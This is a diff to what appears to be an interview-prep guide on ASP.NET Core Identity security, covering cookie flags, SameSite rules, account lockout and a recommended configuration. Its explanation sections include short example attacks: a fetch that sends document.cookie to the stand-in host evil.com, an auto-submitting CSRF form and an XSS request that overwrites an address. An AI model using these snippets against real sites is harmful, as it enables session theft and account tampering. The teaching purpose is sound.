@@ -11,22 +11,24 @@
 <details>
 <summary>The 5% Answer</summary>
 
-**Prevents:** JavaScript accessing `document.cookie`. An XSS payload injected into the page cannot read the session token and exfiltrate it to `https://evil.com/steal?c=`.
+**Prevents:** JavaScript accessing `document.cookie`. An XSS payload cannot read the session token and exfiltrate it.
 
 **Does NOT prevent:**
-- The browser sending the cookie automatically on every HTTP request (that's what cookies do by design)
-- **CSRF** — the browser still includes `HttpOnly` cookies on cross-origin requests unless `SameSite` also restricts it
-- **Network interception** — that's `Secure` (HTTPS only)
-- XSS executing other actions in the victim's browser (making API calls, modifying DOM)
+- **CSRF (Cross-Site Request Forgery)** — browser attaches the cookie automatically on cross-site requests; no JS needed.
+  - Fix: `options.Cookie.SameSite = SameSiteMode.Strict;`
+- **Network interception (MITM)** — cookie travels in plaintext over HTTP.
+  - Fix: `options.Cookie.SecurePolicy = CookieSecurePolicy.Always;`
+- **XSS session abuse** — XSS makes authenticated API calls from the victim's tab; cookie attaches automatically even though JS can't read it.
+  - Fix: CSP(Content Security Policy) header to block injected scripts from running.
 
-**Practical impact:** XSS can still perform actions *as* the user (make authenticated requests from the victim's browser tab) — it just can't steal the token and replay it from a different machine. `HttpOnly` prevents **session hijacking**, not **session abuse**.
+**Practical impact:** `HttpOnly` prevents **session hijacking** (steal token → replay from another machine), not **session abuse** (XSS makes requests from inside the victim's tab).
 
 **Full defence requires all three:**
-| Flag | Prevents |
-|---|---|
-| `HttpOnly` | Cookie theft via `document.cookie` |
-| `Secure` | Cookie sent over HTTP (MITM capture) |
-| `SameSite=Strict` | Cookie attached to cross-site requests (CSRF) |
+| Flag | Prevents | C# setting |
+|---|---|---|
+| `HttpOnly` | Cookie theft via `document.cookie` | `options.Cookie.HttpOnly = true;` |
+| `Secure` | Cookie over HTTP (MITM capture) | `options.Cookie.SecurePolicy = CookieSecurePolicy.Always;` |
+| `SameSite=Strict` | Cookie on cross-site requests (CSRF) | `options.Cookie.SameSite = SameSiteMode.Strict;` |
 
 </details>
 
@@ -43,6 +45,89 @@
 
 **Green Flag:**
 Mentioning that even with `HttpOnly`, XSS can call `fetch('/api/account/address', { method: 'PUT', body: ... })` from the victim's tab and the cookie is attached automatically. `HttpOnly` only blocks `document.cookie` — it doesn't prevent XSS-driven API abuse.
+
+</details>
+
+<details>
+<summary>Explanation</summary>
+
+**Key terms:**
+
+| Term | One-liner |
+|---|---|
+| XSS | Attacker injects JS that runs in the victim's browser |
+| Session token | Random string in cookie = "this browser is authenticated" |
+| Exfiltrate | Script reads data and sends it to attacker's server |
+| CSRF (Cross-Site Request Forgery) | Attacker tricks the browser into sending a request using the victim's cookie |
+| Network interception (MITM) | Someone on the same network reads unencrypted HTTP traffic |
+| Session hijacking | Steal the token → replay it from attacker's machine |
+| Session abuse | XSS makes requests from victim's browser — token never leaves |
+
+---
+
+**Step 1 — How sessions work:**
+You log in → server creates a session token and stores it in your cookie → every request after that sends the cookie automatically → server reads it and knows who you are.
+
+**Step 2 — The attack without `HttpOnly`:**
+Attacker injects a script into a page you visit (XSS). That script runs in your browser and reads your token:
+```js
+fetch('https://evil.com/steal?c=' + document.cookie)
+// attacker receives the token → pastes it in their browser → logged in as you from a different machine
+```
+That's **session hijacking**.
+
+**Step 3 — What `HttpOnly` does:**
+`document.cookie` returns `""`. The script has nothing to send. Token stays safe.
+
+**Step 4 — What it doesn't cover:**
+
+| Gap | What still happens | Fix |
+|---|---|---|
+| Browser attaches cookie to every request automatically | **CSRF** — attacker tricks your browser into sending a request; cookie goes with it, no JS needed | `SameSite=Strict` |
+| Cookie travels in plaintext over HTTP | **Network interception** — anyone on the same network reads traffic and captures the token | `Secure` flag |
+| XSS can still run code in your browser | **Session abuse** — script calls your API from your tab directly, cookie attaches automatically | CSP |
+
+**Step 5 — Hijacking vs abuse:**
+- **Hijacking:** steal the token, use it from a different machine. `HttpOnly` stops this.
+- **Abuse:** XSS stays inside your browser and makes API calls on your behalf. Token never left. `HttpOnly` doesn't help.
+
+**Step 6 — When you legitimately skip `HttpOnly`:**
+Only for non-auth cookies JavaScript needs to read. Examples:
+- `locale=en-GB` — Angular reads it to pick the right language without an API call
+- Feature flag cookie — a client-side script reads it to decide which UI variant to show
+
+Rule: **auth cookies → always `HttpOnly`. Non-sensitive UI state → fine to skip.**
+
+---
+
+**Code examples:**
+
+**CSRF** — victim visits `evil.com` while logged in to `skinet.com`:
+```html
+<form method="POST" action="https://api.skinet.com/api/account/address">
+  <input name="line1" value="1 Evil St">
+</form>
+<script>document.forms[0].submit();</script>
+<!-- browser attaches the HttpOnly cookie → server sees authenticated POST -->
+```
+
+**XSS session abuse** — injected script runs inside the victim's tab:
+```js
+// document.cookie is "" — HttpOnly blocks theft
+// but fetch still sends the cookie automatically:
+fetch('/api/account/address', {
+  method: 'PUT',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ line1: '1 Evil St' })
+})
+// server sees authenticated PUT → address overwritten — token never left the browser
+```
+
+**MITM** — attacker on same network reads raw HTTP:
+```
+Cookie: .AspNetCore.Identity.Application=CfDJ8KlQ3m...
+// SecurePolicy.Always forces HTTPS → this line never appears in plaintext
+```
 
 </details>
 
@@ -134,7 +219,12 @@ Mentioning that returning the same 401 for "wrong password" AND "account locked"
 <details>
 <summary>The 5% Answer</summary>
 
-- **`Lax`:** cookie sent on top-level GET navigations (link clicks from external sites) + all same-site requests. Not sent on cross-site sub-requests (XHR/fetch/forms/images). ASP.NET Core default since .NET 6.
+- **`Lax`:**
+  - Cookie **sent** on top-level navigations: link click, bookmark, address bar
+  - Cookie **sent** on all same-site requests
+  - Cookie **blocked** on cross-site background requests: `fetch`, form POST, images loaded from another site
+  - CSRF attacks rely on background requests → `Lax` still blocks CSRF while keeping email links and social shares working
+  - ASP.NET Core default since .NET 6
 - **`Strict`:** cookie never sent on any cross-site request — including top-level GET navigations.
 
 **Where `Strict` breaks things `Lax` doesn't:**
@@ -164,7 +254,57 @@ Mentioning that returning the same 401 for "wrong password" AND "account locked"
 <summary>Green Flag</summary>
 
 **Green Flag:**
-Mentioning **eTLD+1 same-site determination**: `app.skinet.com` and `api.skinet.com` are **same-site** — they share `skinet.com` as the registrable domain. `SameSite=Strict` doesn't block them. But `app.skinet.com` and `api.otherdomain.com` are **cross-site**. Knowing this is why `localhost:4200` → `localhost:7096` works in dev with `Strict` — both resolve to `localhost` eTLD+1.
+Knowing that same-site is determined by **eTLD+1** (registrable domain), not the full hostname — so subdomains like `app.skinet.com` + `api.skinet.com` are same-site and `Strict` won't block them, but `app.skinet.com` + `api.otherdomain.com` are cross-site and `Strict` will.
+
+</details>
+
+<details>
+<summary>Explanation</summary>
+
+**eTLD+1 same-site boundary:**
+
+| Frontend | Backend | Same-site? | Strict blocks? |
+|---|---|---|---|
+| `app.skinet.com` | `api.skinet.com` | Yes — share `skinet.com` | No — cookie sent |
+| `app.skinet.com` | `api.otherdomain.com` | No — different domains | **Yes — cookie blocked** |
+| `localhost:4200` | `localhost:7096` | Yes — both `localhost` | No — works in dev |
+
+The `otherdomain.com` row is the trap: if your API were on a completely separate domain, `Strict` would silently break your entire app — every authenticated request would be rejected. Subdomains sharing the same registrable domain are safe; separate domains are not.
+
+---
+
+**OAuth vs cookie-only:**
+
+| | OAuth/OIDC | Cookie-only |
+|---|---|---|
+| Who verifies the user | External IdP (Google, Azure AD) | Your own server |
+| Who stores passwords | The IdP — you never see them | You (bcrypt) |
+| Used by | SaaS, enterprise B2B, marketplaces | Banking, government, internal tools, this project |
+| After login | Your server still issues a session cookie | Session cookie |
+
+**Can you use both?** Yes — most serious apps do. OAuth handles the front door, cookie handles staying inside:
+
+| Step | Mechanism |
+|---|---|
+| "Sign in with Google" button | OAuth/OIDC |
+| "Sign in with email" button | Cookie-only |
+| All requests after login | Session cookie (both paths converge here) |
+
+**Why `Strict` breaks OAuth:** the IdP redirect back to your app is a cross-site GET navigation — `Strict` withholds the cookie on that redirect → app sees the user as unauthenticated right after a successful login. `Lax` allows it.
+
+---
+
+**HttpOnly is not an auth method — it's a cookie attribute:**
+
+| Login option | Auth method | After login |
+|---|---|---|
+| "Sign in with Google" | OAuth/OIDC | Server issues a session cookie |
+| "Sign in with email + password" | Credential-based auth | Server issues a session cookie |
+
+Both paths end with a session cookie. `HttpOnly` is just a security flag on that cookie — it means JavaScript can't read it. It applies to both cases regardless of how the user logged in.
+
+- **Cookie-only auth** = no OAuth, you manage passwords yourself (this project)
+- **HttpOnly** = a flag on the cookie, not an auth method
 
 </details>
 
@@ -225,32 +365,14 @@ Mentioning that `IdentityConstants.ApplicationScheme` is the literal string `"Id
 <details>
 <summary>The 5% Answer</summary>
 
-**What the default (`false`) does:**
-Identity's lockout code checks the per-user `AspNetUsers.LockoutEnabled` column **before** incrementing `AccessFailedCount`. With `AllowedForNewUsers = false`, `UserManager.CreateAsync(user, password)` stores `LockoutEnabled = false` on the row. Failed logins against that account never increment the counter → the `MaxFailedAccessAttempts = 5` threshold is never reached → **lockout never fires**.
+`AllowedForNewUsers = true` makes `CreateAsync` store `LockoutEnabled = true` on every new row. The default (`false`) stores `LockoutEnabled = false` — Identity checks this column before incrementing `AccessFailedCount`, so **lockout never fires** for that user regardless of `MaxFailedAccessAttempts`.
 
+**Attack window closed:** from registration, an attacker can attempt unlimited passwords — credential-stuffing 10,000 breached passwords hits no threshold. With `true`, lockout applies from day one.
+
+**Migration catch:** changing the config doesn't fix existing users — Identity checks the per-row column, not the options value:
 ```sql
--- Fresh user with the default
-SELECT Email, LockoutEnabled, AccessFailedCount, LockoutEnd
-FROM AspNetUsers WHERE Email = 'newuser@test.com'
--- LockoutEnabled: 0         (disabled — lockout never runs for this user)
--- AccessFailedCount: 0      (never incremented)
--- LockoutEnd: NULL          (never set regardless of attempt count)
+UPDATE AspNetUsers SET LockoutEnabled = 1 WHERE LockoutEnabled = 0;
 ```
-
-**What `AllowedForNewUsers = true` changes:**
-`CreateAsync` stores `LockoutEnabled = true`. Every failed login increments the counter; at 5 failures Identity locks the account per the configured window.
-
-**The attack window the default leaves open:**
-From account registration until someone explicitly enables lockout on that row, an attacker with the email can attempt **unlimited passwords**. Concretely:
-- **Credential stuffing**: replay 10,000 leaked passwords from a different breach — all 10,000 HTTP attempts are valid with no throttling at the Identity layer
-- **Targeted brute force**: even with a 12-char password policy, automated attacks that bias toward common patterns (`Pa$$w0rd`, `Summer2025!`) succeed regularly
-
-With `true`, the window is closed from the moment the user is created — no post-registration admin step required.
-
-**Why the default is `false`:**
-Backwards compatibility with the pre-Identity-2.0 design where lockout was strictly opt-in per-user. Modern apps should always set `AllowedForNewUsers = true`.
-
-**Production consequence:** with the default, every user registered before an admin notices the misconfiguration has an account that is **permanently** unprotected against credential stuffing — even after `AllowedForNewUsers = true` is added. Changing the config only affects users created after that point; existing rows keep `LockoutEnabled = 0` until you migrate them.
 
 </details>
 
@@ -258,7 +380,7 @@ Backwards compatibility with the pre-Identity-2.0 design where lockout was stric
 <summary>Red Flag</summary>
 
 **Red Flag:**
-"Defaults are secure." In Identity, multiple lockout defaults are **permissive**: `AllowedForNewUsers = false`, `MaxFailedAccessAttempts = 5`, `DefaultLockoutTimeSpan = TimeSpan.FromMinutes(5)` (short enough that an attacker comfortably restarts brute force every 5 minutes). Assuming defaults are tight is the wrong mental model — read every lockout option.
+"Defaults are secure." Identity's lockout defaults are permissive — `AllowedForNewUsers = false`, `DefaultLockoutTimeSpan = 5min`. Never assume defaults are tight.
 
 </details>
 
@@ -266,11 +388,7 @@ Backwards compatibility with the pre-Identity-2.0 design where lockout was stric
 <summary>Green Flag</summary>
 
 **Green Flag:**
-Knowing that flipping `AllowedForNewUsers` to `true` **does not retroactively enable lockout on existing users** — Identity checks the per-row `LockoutEnabled`, not the options value, at login time. Migrating existing accounts requires a one-time SQL update:
-```sql
-UPDATE AspNetUsers SET LockoutEnabled = 1 WHERE LockoutEnabled = 0;
-```
-An audit step before enabling this globally: check `SELECT COUNT(*) WHERE LockoutEnabled = 0` to see how many accounts are currently unprotected.
+Knowing the config change is not retroactive — existing `LockoutEnabled = 0` rows stay unprotected until you run the migration SQL.
 
 </details>
 
@@ -380,45 +498,30 @@ Mentioning that `UserManager.GetLockoutEndDateAsync(user)` returns a `DateTimeOf
 
 ---
 
-**C9.** [HIGH] Design the complete authentication security configuration for this project. For each setting, justify the specific value chosen and identify what production attack it prevents.
+**C9.** [HIGH] Design the complete authentication security configuration for a B2C e-commerce app with cookie-only auth, no external IdPs, and stored payment data. For each setting, justify the specific value chosen and identify what production attack it prevents.
 
 <details>
 <summary>The 5% Answer</summary>
 
 ```csharp
 // Password policy
-options.Password.RequiredLength = 12;           // entropy floor; NIST recommends ≥8, we use 12
-options.Password.RequireUppercase = true;        // prevents trivially-lowercase passwords
-options.Password.RequireDigit = true;            // prevents dictionary word attacks
-options.Password.RequireNonAlphanumeric = true;  // forces character class diversity
+options.Password.RequiredLength = 12;                              // entropy floor — raises brute-force cost
+options.Password.RequireUppercase = true;                          // blocks all-lowercase dictionary attacks
+options.Password.RequireDigit = true;                              // blocks pure-word attacks
+options.Password.RequireNonAlphanumeric = true;                    // forces character class diversity
 
 // Lockout
-options.Lockout.MaxFailedAccessAttempts = 5;     // 5 attempts before lockout
-options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);  // 15min window
-options.Lockout.AllowedForNewUsers = true;        // lockout applies from day 1, not after first success
+options.Lockout.MaxFailedAccessAttempts = 5;                       // brute-force threshold
+options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15); // throttles credential stuffing
+options.Lockout.AllowedForNewUsers = true;                         // lockout from day 1, not after first success
 
 // Cookie
-options.Cookie.HttpOnly = true;          // prevents XSS cookie theft
-options.Cookie.SecurePolicy = CookieSecurePolicy.Always;  // HTTPS-only, prevents MITM
-options.Cookie.SameSite = SameSiteMode.Strict;  // prevents CSRF
-options.ExpireTimeSpan = TimeSpan.FromHours(24); // 24h absolute session
-options.SlidingExpiration = false;               // no renewal; stolen token expires predictably
+options.Cookie.HttpOnly = true;                                    // blocks XSS token theft
+options.Cookie.SecurePolicy = CookieSecurePolicy.Always;           // HTTPS-only, blocks MITM
+options.Cookie.SameSite = SameSiteMode.Strict;                     // blocks CSRF
+options.ExpireTimeSpan = TimeSpan.FromHours(24);                   // absolute session cap
+options.SlidingExpiration = false;                                 // stolen token expires predictably
 ```
-
-| Setting | Value | Attack prevented |
-|---|---|---|
-| `RequiredLength = 12` | 12 chars | Dictionary/brute force |
-| `MaxFailedAccessAttempts = 5` | 5 attempts | Online brute force |
-| `DefaultLockoutTimeSpan = 15min` | 15 min | Automated credential stuffing |
-| `HttpOnly = true` | true | XSS token exfiltration |
-| `SecurePolicy = Always` | Always | MITM cookie interception |
-| `SameSite = Strict` | Strict | CSRF (cross-site request forgery) |
-| `ExpireTimeSpan = 24h` | 24 hours | Indefinite stolen session |
-| `SlidingExpiration = false` | false | Session kept alive by attacker |
-
-**NIST 2024 note:** SP 800-63B recommends checking passwords against known breached lists over enforcing complexity rules. Complexity rules cause predictable patterns ("Password1!"). Consider integrating `IPasswordValidator<AppUser>` with HaveIBeenPwned API for production hardening.
-
-**Production consequence:** any one of the eight settings left at default degrades defence-in-depth silently — missing `HttpOnly` enables XSS cookie theft, missing `Secure` allows MITM on HTTP, missing `SameSite=Strict` enables CSRF. A partial security config produces no warnings, breaks no tests, and surfaces only after an incident.
 
 </details>
 
